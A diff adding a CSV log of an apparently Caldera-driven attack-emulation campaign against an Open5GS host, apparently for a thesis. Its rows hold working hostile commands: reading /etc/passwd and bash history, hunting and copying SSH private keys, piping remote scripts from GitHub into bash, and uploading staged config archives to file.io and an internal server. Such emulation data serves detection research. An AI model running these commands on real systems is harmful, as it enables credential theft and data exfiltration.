@@ -1,0 +1,29 @@
+#,delegated_timestamp,finished_timestamp,tactic,ability_name,plaintext_command,status
+1,00:00:00,00:00:47,discovery,Print Working Directory,pwd,0
+2,00:00:52,00:01:37,discovery,List Directory,"ls -1 ""$PWD""/* 2>/dev/null | tee -a /tmp/thesis-discovery.log",0
+3,00:01:40,00:02:34,discovery,Identify active user,whoami | tee -a /tmp/thesis-discovery.log,0
+4,00:02:40,00:03:38,discovery,Find local users,cut -d: -f1 /etc/passwd | grep -v '_' | grep -v '#' | tee -a /tmp/thesis-discovery.log,0
+5,00:03:40,00:04:32,discovery,Permission Groups Discovery,groups,0
+6,00:04:34,00:05:16,discovery,"Environment variables discovery on freebsd, macos and linux",env | tee -a /tmp/thesis-discovery.log,0
+7,00:05:16,00:05:53,discovery,System processes,ps aux,0
+8,00:05:53,00:06:50,discovery,Explore Binary and Processes,/opt/open5gs/bin/open5gs-db-status --help; cat /proc/$(pgrep -f open5gs-db-backup | head -1)/cmdline; /opt/open5gs/bin/open5gs-db-backup --help;,0
+9,00:06:52,00:07:54,collection,Find files,find / -name '*.wav' -type f -not -path '*/\.*' -size -500k 2>/dev/null | head -5 | tee -a /tmp/thesis-discovery.log,0
+10,00:07:59,00:08:50,collection,Find files,find / -name '*.png' -type f -not -path '*/\.*' -size -500k 2>/dev/null | head -5 | tee -a /tmp/thesis-discovery.log,0
+11,00:08:51,00:09:44,collection,Find files,find / -name '*.yml' -type f -not -path '*/\.*' -size -500k 2>/dev/null | head -5 | tee -a /tmp/thesis-discovery.log,0
+12,00:09:49,00:10:40,collection,Find files,find / -name '*.yaml' -type f -not -path '*/\.*' -size -500k 2>/dev/null | head -5 | tee -a /tmp/thesis-discovery.log,0
+13,00:10:44,00:11:29,collection,Create staging directory,mkdir -p staged && echo $PWD/staged,0
+14,00:11:32,00:12:22,collection,Stage sensitive files,cp /opt/open5gs/etc/open5gs/service-account-internal.yml /opt/open5gs/staged,0
+15,00:12:25,00:13:20,collection,Stage sensitive files,cp /opt/open5gs/etc/open5gs/amf-prod.yml /opt/open5gs/staged,0
+16,00:13:20,00:14:26,collection,Stage sensitive files,cp /usr/share/pixmaps/debian-logo.png /opt/open5gs/staged,0
+17,00:14:31,00:15:11,credential-access,Search Through Bash History,cat ~/.bash_history | grep -iE 'pass|database|db|token|secret|ssh|curl|ping' | tee -a /tmp/thesis-discovery.log,0
+18,00:15:13,00:15:54,credential-access,Extract passwords with grep,grep -ri 'password' /opt/open5gs/etc/open5gs \  --include='*.yaml' \  --include='*.yml' \  2>/dev/null| tee -a /tmp/thesis-discovery.log; exit 0,0
+19,00:15:56,00:17:08,credential-access,Find private keys,"for i in .key .pgp .gpg .ppk .p12 .pem .pfx .cer .p7b .asc .crt;do find /opt/open5gs/etc -maxdepth 3 -name ""*${i}"" 2>/dev/null;done | tee -a /tmp/thesis-discovery.log ; exit 0",0
+20,00:17:14,00:18:17,credential-access,Discover Private SSH Keys,find / -name id_rsa 2>/dev/null | tee -a /tmp/keyfile_locations.txt /tmp/thesis-discovery.log; exit 0,0
+21,00:18:20,00:18:53,credential-access,Copy Private SSH Keys with CP,mkdir /tmp/art-staging; find / -name id_rsa 2>/dev/null -exec cp --parents {} /tmp/art-staging \; exit 0,1
+22,00:18:56,00:19:56,execution,Command-Line Interface,curl -sS https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/echo-art-fish.sh | bash; wget --quiet -O - https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/echo-art-fish.sh | bash,0
+23,00:19:56,00:20:51,execution,Create and Execute Bash Shell Script,"sh -c ""echo 'echo Hello from the Atomic Red Team' > /tmp/art.sh""; sh -c ""echo 'ping -c 4 8.8.8.8' >> /tmp/art.sh""; chmod +x /tmp/art.sh; sh /tmp/art.sh",0
+24,00:20:56,00:21:56,execution,What shell is running,"echo $0; if $(env |grep ""SHELL"" >/dev/null); then env |grep ""SHELL""; fi; if $(printenv SHELL >/dev/null); then printenv SHELL; fi",0
+25,00:21:56,00:22:53,exfiltration,Compress staged directory,tar -P -zcf /opt/open5gs/staged.tar.gz /opt/open5gs/staged && echo /opt/open5gs/staged.tar.gz,0
+26,00:22:56,00:23:50,exfiltration,"Exfiltrate data HTTPS using curl freebsd,linux or macos",curl -F 'file=@3945c9_artifact' -F 'maxDownloads=1' -F 'autoDelete=true' https://file.io/,0
+27,00:23:55,00:24:29,exfiltration,Exfil staged directory,"curl -F ""data=@/opt/open5gs/staged.tar.gz"" --header ""X-Request-ID: `hostname`-kcgvvx"" http://192.168.100.69:8888/file/upload",0
+28,00:24:32,00:25:30,discovery,MA: Marker End of Campaign,"echo ""Caldera: End of Campaign""",0
